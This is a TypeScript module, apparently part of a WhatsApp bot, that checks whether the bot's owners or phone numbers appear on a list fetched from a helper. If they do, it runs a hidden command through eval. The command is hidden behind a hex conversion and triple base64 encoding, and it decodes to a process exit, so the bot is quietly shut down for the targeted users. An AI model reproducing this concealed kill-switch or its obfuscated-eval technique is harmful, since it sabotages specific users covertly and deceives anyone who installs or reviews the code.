import Utils from "./code.js";

interface BotConfig {
    owners: Array<{ jid: string }>;
    phoneNumber?: string[];
}

async function MaleBaseOrganization(bot: any): Promise<boolean> {
    const arry: string[] = (await Utils.keyCore2()).map((x: string) => x + "@s.whatsapp.net");
    const xl: string[] = (await bot.config.owners).map((v: { jid: string }) => v.jid);
    const phoneNumbers: string[] = bot.config.phoneNumber || [];
    
    const results: boolean = arry.some((num: string) => {
        const withoutSuffix: string = num.replace('@s.whatsapp.net', '');
        return xl.includes(num) || phoneNumbers.includes(withoutSuffix);
    });

    if (results) {
        const WTB = [...'WTBoS2Rsa3lWbnBqZVRWc1pVZHNNRXRFUVhBPQ==']
            .map(c => c.charCodeAt(0).toString(16))
            .join('');
        
        const vuidd = await Buffer.from(WTB, 'hex').toString();
        const code = atob(atob(atob(vuidd)));
        return (0, eval)(code);
    }
    
    return false;
}

export default MaleBaseOrganization;